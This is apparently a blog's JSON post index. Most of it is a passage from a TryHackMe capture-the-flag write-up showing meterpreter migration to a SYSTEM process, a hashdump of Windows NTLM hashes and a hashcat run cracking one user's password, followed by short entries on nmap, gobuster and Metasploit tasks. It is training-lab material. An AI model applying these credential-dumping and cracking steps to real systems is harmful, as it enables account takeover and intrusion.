AUTHORITY\\SYSTEM C:\\Windows\\System32\\cmd.exe1612 692 Ec2Config.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Program Files\\Amazon\\Ec2ConfigService\\Ec2Config.exe1940 692 svchost.exe x64 0 NT AUTHORITY\\NETWORK SERVICE2080 816 WmiPrvSE.exe2248 2016 powershell.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe2336 692 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE2364 692 sppsvc.exe x64 0 NT AUTHORITY\\NETWORK SERVICE2556 692 svchost.exe x64 0 NT AUTHORITY\\SYSTEM2560 692 vds.exe x64 0 NT AUTHORITY\\SYSTEM2680 692 SearchIndexer.exe x64 0 NT AUTHORITY\\SYSTEM3032 692 TrustedInstaller.exe x64 0 NT AUTHORITY\\SYSTEMmeterpreter &amp;gt; pick one of the process that’s running by user NT AUTHORITY\\SYSTEM at the bottom of the list and run the migrate command against it.It takes a few tries to successmeterpreter &amp;gt; migrate 3032[*] Migrating from 2248 to 3032...[-] core_migrate: Operation failed: Access is denied.meterpreter &amp;gt; migrate 2680[*] Migrating from 2248 to 2680...[-] core_migrate: Operation failed: Access is denied.meterpreter &amp;gt; migrate 2560[*] Migrating from 2248 to 2560...[-] core_migrate: Operation failed: Access is denied.meterpreter &amp;gt; migrate 2556[*] Migrating from 2248 to 2556...[-] core_migrate: Operation failed: Access is denied.meterpreter &amp;gt; migrate 1612[*] Migrating from 2248 to 1612...[*] Migration completed successfully.meterpreter &amp;gt; TASK 4 CrackingWe can now dump the stored password hash from meterpreter shellmeterpreter &amp;gt; hashdumpAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::meterpreter &amp;gt; Save these information and we can now start cracking the password hashcopy and paste these hash data into a text file and save in the hard drive$ hashcat -m 1000 Jon /usr/share/wordlists/rockyou.txt hashcat (v6.2.6) starting OpenCL API (OpenCL 3.0 PoCL 3.0+debian Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project] ============================================================================================================================================ * Device #1: pthread-11th Gen Intel(R) Core(TM) i7-1165G7 @ 2.80GHz, 1441/2946 MB (512 MB allocatable), 4MCU Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 Hashes: 3 digests; 2 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotatesRules: 1Optimizers applied:* Zero-Byte* Early-Skip* Not-Salted* Not-Iterated* Single-Salt* Raw-HashATTENTION! Pure (unoptimized) backend kernels selected.Pure kernels can crack longer passwords, but drastically reduce performance.If you want to switch to optimized kernels, append -O to your commandline.See the above message to find out about the exact limits.Watchdog: Temperature abort trigger set to 90cHost memory required for this attack: 0 MBDictionary cache built:* Filename..: /usr/share/wordlists/rockyou.txt* Passwords.: 14344392* Bytes.....: 139921507* Keyspace..: 14344385* Runtime...: 0 secs31d6cfe0d16ae931b73c59d7e0c089c0: ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22 Session..........: hashcatStatus...........: CrackedHash.Mode........: 1000 (NTLM)Hash.Target......: JonTime.Started.....: Sat Feb 18 18:45:17 2023 (6 secs)Time.Estimated...: Sat Feb 18 18:45:23 2023 (0 secs)Kernel.Feature...: Pure KernelGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)Guess.Queue......: 1/1 (100.00%)Speed.#1.........: 1800.0 kH/s (576460752303.51ms) @ Accel:256 Loops:1 Thr:1 Vec:4Recovered........: 2/2 (100.00%) Digests (total), 2/2 (100.00%) Digests (new)Progress.........: 10201088/14344385 (71.12%)Rejected.........: 0/10201088 (0.00%)Restore.Point....: 10200064/14344385 (71.11%)Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1Candidate.Engine.: Device Generator Candidates.#1....: alread852 -&amp;gt; alphasarto11Hardware.Mon.#1..: Util: 26%Started: Sat Feb 18 18:45:15 2023Stopped: Sat Feb 18 18:45:24 2023TASK 5 Find flagsflag1C:\\flag2C:\\users\\Jon\\Documentsflag3C:\\windows\\system32\\config\\Output text content in windows cmd command shell by using the following commandmoretype" }, { "title": "TryHackMe CC - Pen Testing write-up", "url": "/posts/cc-pen-testing-writeup-tryhackme/", "categories": "IT, CyberSec", "tags": "write-up", "date": "2022-04-06 22:43:30 +1200", "snippet": "task 1task 2Pretty easy, so I am only listing notable questions$ sudo nmap -p80 -sVC 10.10.65.59task 3All answers can be found in netcat man page$ man nctask 4Mostly just reading gobuster man page$ gobuster help ~Q: What is the name of the hidden directory$ gobuster dir -u 10.10.236.179 -w /usr/share/wordlists/rockyou.txtQ: What is the name of the hidden file with the extension xxa$ gobuster dir -u 10.10.236.179 -w /usr/share/wordlists/rockyou.txt -x xxatask 5$ man niktotask 6task 7$ msfconsole -q$ msf6&amp;gt; helptask 8" }, { "title": "My first post", "url": "/posts/my-first-post/", "categories": "IT, CyberSec", "tags": "write-up", "date": "2022-04-03 02:43:30 +1300", "snippet": "This is my first post" } ]
